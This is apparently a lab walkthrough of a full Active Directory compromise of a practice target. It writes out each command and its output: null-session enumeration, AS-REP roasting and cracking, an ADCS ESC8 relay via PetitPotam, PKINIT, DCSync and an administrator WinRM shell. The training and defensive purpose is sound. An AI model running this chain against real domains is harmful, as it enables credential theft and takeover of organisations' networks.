[🇬🇧 Engliish](README.md) | [🇫🇷 Français](README.fr.md)

---

# ShadowGate — Active Directory Pentest Walkthrough

**Target:** `10.1.143.92`
**OS:** Windows Server 2022 (Build 20348)
**Domain:** `shadow.gate` | **DC:** `DC01.shadow.gate`
**Difficulty:** Easy
**Category:** Active Directory / ADCS
**Platform:** HackSmarter

---

## Challenge Objective

> ShadowGate recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.
>
> While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.
>
> The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

**Initial Access:** VPN access to the internal network only, no credentials provided.

![Challenge objective](screenshots/00-challenge-objective.png)

---

## Attack Chain Summary

```
Recon (SMB null session)
  → User Enumeration
  → AS-REP Roasting (jtrueblood)
  → Hash cracked
  → ADCS discovered via CertEnroll share
  → ESC8 confirmed (Certipy)
  → PetitPotam coercion + Certipy relay
  → DC01 machine certificate (dc01.pfx)
  → NT hash via PKINIT
  → DCSync
  → Domain Admin
```

---

## 1. Reconnaissance

### SMB Service Discovery

```bash
nxc smb 10.1.143.92
```

```
SMB    10.1.143.92   445   DC01   [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
```

**Finding:** Windows Server 2022, hostname `DC01`, domain `shadow.gate`, **SMB signing disabled** — already a red flag, it opens the door to NTLM relay later in the chain.

![Recon - SMB banner](screenshots/01-smb-banner.png)

---

## 2. Enumeration — Null Session

A **null session** is an anonymous SMB connection (empty username, empty password). If `RestrictAnonymous` is misconfigured on the DC, it allows querying the SAMR interface and listing domain accounts without any credentials.

```bash
nxc smb 10.1.143.92 -u '' -p '' --users
```

```
SMB    10.1.143.92   445   DC01   [+] shadow.gate\: 
SMB    10.1.143.92   445   DC01   -Username-        -Last PW Set-        -BadPW- -Description-
SMB    10.1.143.92   445   DC01   Administrator      2026-01-11 11:33:05  0      Built-in account for administering the computer/domain
SMB    10.1.143.92   445   DC01   Guest              <never>              0      Built-in account for guest access to the computer/domain
SMB    10.1.143.92   445   DC01   krbtgt              2026-01-12 02:45:27  0      Key Distribution Center Service Account
SMB    10.1.143.92   445   DC01   ATHENA              2026-03-04 15:23:19  0
SMB    10.1.143.92   445   DC01   mbrownlee           2026-03-04 15:24:05  0
SMB    10.1.143.92   445   DC01   bbrown              2026-01-15 14:24:07  0
SMB    10.1.143.92   445   DC01   jtrueblood          2026-04-28 18:14:47  0
SMB    10.1.143.92   445   DC01   jsmith              2026-03-04 15:26:29  0
SMB    10.1.143.92   445   DC01   clocke              2026-03-04 15:24:32  0
SMB    10.1.143.92   445   DC01   tclarke             2026-03-04 15:25:33  0
SMB    10.1.143.92   445   DC01   jbradford           2026-03-04 15:24:59  0
SMB    10.1.143.92   445   DC01   amoss               2026-03-04 15:25:52  0
SMB    10.1.143.92   445   DC01   [*] Enumerated 12 local users: SHADOW
```

**Finding:** 12 domain users enumerated anonymously.

![Enumeration - user list via null session](screenshots/02-null-session-users.png)

### Building the username list

```bash
cat > users.txt << 'EOF'
administrator
guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
EOF
```

---

## 3. Initial Access — AS-REP Roasting

### Theory

Kerberos authentication normally requires **pre-authentication**: the client proves it knows the account's password by encrypting a timestamp with the password-derived NT hash (AS-REQ), and the KDC validates it before issuing a TGT (AS-REP).

If an account has the attribute **`UF_DONT_REQUIRE_PREAUTH`** set, the KDC skips this check and issues the AS-REP anyway. Part of that AS-REP is encrypted with the **account's own NT hash**, which can be extracted and cracked offline — this is **AS-REP Roasting**.

### Attack

```bash
impacket-GetNPUsers shadow.gate/ -usersfile users.txt -no-pass -dc-ip 10.1.143.92
```

```
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jtrueblood@SHADOW.GATE:[REDACTED]
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Finding:** `jtrueblood` does not require Kerberos pre-authentication → AS-REP hash captured.

![AS-REP Roasting result](screenshots/03-asrep-hash.png)

### Cracking the hash

```bash
hashcat -m 18200 jtrueblood.asrep /usr/share/wordlists/rockyou.txt
```

Alternative with John the Ripper:

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt jtrueblood.asrep
john --format=krb5asrep --show jtrueblood.asrep
```

```
$krb5asrep$23$jtrueblood@SHADOW.GATE:[REDACTED]
1 password hash cracked, 0 left
```

**Credentials obtained:**
- Username: `jtrueblood`
- Password: `[REDACTED]`
- Domain: `SHADOW.GATE`

![Hash cracked](screenshots/04-hash-cracked.png)

---

## 4. Post-Exploitation Enumeration (as jtrueblood)

### Validate credentials and list shares

```bash
nxc smb 10.1.143.92 -u jtrueblood -p '[REDACTED]' --shares
```

```
SMB    10.1.143.92   445   DC01   [+] shadow.gate\jtrueblood:[REDACTED]
Share        Permissions   Remark
-----        -----------   ------
ADMIN$                     Remote Admin
C$                         Default share
CertEnroll   READ          Active Directory Certificate Services share
IPC$         READ          Remote IPC
NETLOGON     READ          Logon server share
SYSVOL       READ          Logon server share
```

**Key finding:** The `CertEnroll` share is present. This share only exists when **Active Directory Certificate Services (ADCS)** is installed — an immediate signal that a Certificate Authority is running on the DC and should be audited.

![Shares enumeration](screenshots/05-shares.png)

### Browsing the CertEnroll share

```bash
smbclient //10.1.143.92/CertEnroll -U 'jtrueblood'
```

```
DC01.shadow.gate_shadow-DC01-CA.crt
nsrev_shadow-DC01-CA.asp
shadow-DC01-CA+.crl
shadow-DC01-CA.crl
```

![CertEnroll share contents](screenshots/06-certenroll-share.png)

---

## 5. ADCS Enumeration — Finding ESC8

```bash
certipy find -u jtrueblood -p '[REDACTED]' -dc-ip 10.1.143.92 -vulnerable -stdout
```

```
Certificate Authorities
  0
    CA Name                 : shadow-DC01-CA
    DNS Name                : DC01.shadow.gate
    Web Enrollment
      HTTP
        Enabled              : True
      HTTPS
        Enabled              : False
    Access Rights
      Enroll                 : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                   : Web Enrollment is enabled over HTTP.
```

**Finding — ESC8:** The CA has Web Enrollment enabled over **HTTP** (not HTTPS), and `Authenticated Users` can enroll. Since HTTP NTLM authentication to the enrollment endpoint has no protection against relay, this opens the door to an NTLM relay attack against the CA.

![Certipy find - ESC8 vulnerability](screenshots/07-certipy-esc8.png)

---

## 6. Privilege Escalation — ESC8 (ADCS NTLM Relay via PetitPotam)

### Theory

The attack works in three parts:

1. We stand up an NTLM relay listener (`certipy relay`) pointed at the CA's web enrollment endpoint.
2. We coerce the Domain Controller to authenticate to our machine using **PetitPotam** (abuses the MS-EFSRPC protocol).
3. The DC's NTLM authentication is relayed to the CA, which issues a **certificate for the DC's own machine account (`DC01$`)** based on the `DomainController` template.

That certificate can then be used to authenticate as `DC01$` via Kerberos PKINIT and retrieve its NT hash.

### Prerequisite — add the DC to `/etc/hosts`

```bash
echo "10.1.143.92 DC01.shadow.gate shadow.gate" | sudo tee -a /etc/hosts
```

### Step 1 — Start the Certipy relay (Terminal 1)

```bash
certipy relay -target http://DC01.shadow.gate/certsrv/certfnsh.asp -template DomainController
```

### Step 2 — Coerce DC authentication with PetitPotam (Terminal 2)

```bash
git clone https://github.com/topotam/PetitPotam /opt/PetitPotam
python3 /opt/PetitPotam/PetitPotam.py -u jtrueblood -p '[REDACTED]' -d shadow.gate <KALI_IP> 10.1.143.92
```

```
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

![PetitPotam coercion success](screenshots/08-petitpotam.png)

### Result — Terminal 1 (relay)

```
[*] (SMB): Authenticating connection from /@10.1.143.92 against http://DC01.shadow.gate SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] Certificate issued with request ID 5
[*] Got certificate with DNS Host Name 'DC01.shadow.gate'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

**Finding:** The DC authenticated to our relay, and a valid machine certificate (`dc01.pfx`) for `DC01$` was issued and saved.

![Certipy relay - certificate obtained](screenshots/09-certipy-relay-success.png)

---

## 7. PKINIT — Retrieving the Machine Account NT Hash

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.1.143.92
```

```
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
```

**Explanation:** The certificate proves the identity `DC01$`. Certipy uses it to request a TGT via **PKINIT** (certificate-based Kerberos authentication) and derives the account's NT hash from the ticket exchange.

![PKINIT authentication - NT hash retrieved](screenshots/10-certipy-auth.png)

---

## 8. Lateral Movement — DCSync

Domain Controller machine accounts have, by default, replication rights (`Get-Replication-Changes-All`) on the domain. With `DC01$`'s NT hash, we can perform a legitimate-looking **DCSync** to dump all domain credentials.

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:[REDACTED] shadow.gate/DC01\$@10.1.143.92
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
...
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
```

**Finding:** Full domain credential dump obtained, including:
- `Administrator` NT hash → full admin access
- `krbtgt` NT hash → Golden Ticket persistence possible

![DCSync - full domain hash dump](screenshots/11-secretsdump.png)

---

## 9. Domain Admin Access

```bash
evil-winrm -i 10.1.143.92 -u administrator -H '[REDACTED]'
```

![Domain Admin shell obtained](screenshots/12-evil-winrm.png)

**ShadowGate pwned.**

---

## Key Takeaways

- A **SMB null session** was enough to enumerate the full list of domain users via SAMR.
- `jtrueblood` had `UF_DONT_REQUIRE_PREAUTH` set, enabling **AS-REP Roasting** with zero prior credentials.
- The **`CertEnroll`** share is a reliable giveaway that ADCS is installed — always check for it when enumerating shares on a DC.
- **ESC8** only requires valid domain credentials plus an HTTP (non-HTTPS) web enrollment endpoint — a very common ADCS misconfiguration.
- `certipy relay` is purpose-built for ADCS relay attacks and simpler than `impacket-ntlmrelayx --adcs` for this scenario.
- The DC's own machine account (`DC01$`) has DCSync rights by default — compromising it is equivalent to compromising the domain.
- The `krbtgt` hash obtained enables **Golden Ticket** attacks for long-term persistence.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nxc` (NetExec) | SMB enumeration, credential validation |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `hashcat` / `john` | Offline hash cracking |
| `smbclient` | Share browsing |
| `certipy-ad` | ADCS enumeration, NTLM relay, PKINIT |
| `PetitPotam` | DC authentication coercion (MS-EFSRPC) |
| `impacket-secretsdump` | DCSync |
| `evil-winrm` | Remote shell access |

---

## References

- [Certified Pre-Owned — SpecterOps (ESC8 original research)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [PetitPotam — GitHub (topotam)](https://github.com/topotam/PetitPotam)
- [Certipy — GitHub (ly4k)](https://github.com/ly4k/Certipy)
